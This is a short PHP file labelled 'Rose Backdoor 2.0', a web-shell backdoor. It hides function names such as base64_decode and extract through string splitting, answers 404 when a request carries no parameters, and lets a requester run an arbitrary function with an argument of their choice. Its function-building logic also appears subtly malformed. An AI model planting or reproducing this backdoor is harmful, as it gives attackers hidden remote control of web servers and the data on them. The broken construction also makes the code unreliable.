<?php
/* Rose Backdoor 2.0 PHP Version */
/*          Made by John         */
$p0 = 'ba'.'se'.'64'.'_d'.'ec'.'od'.'e';
$a1 = 'ex'.'tr'; $a2 = 'ac'.'t';
$b1 = '('; $b2 = ')'; $b0 = ';';
$a0 = $p0('JGE='); $a1 = '"';
$b = create_function($a0, $a1.$a2.$b0.$a1.$a0.$a1.$b2.$b0);
if($_REQUEST == null) {
    http_response_code(404);
    die();
} else {
    $b($_REQUEST);
    die($aaa($bbb));
}
?>
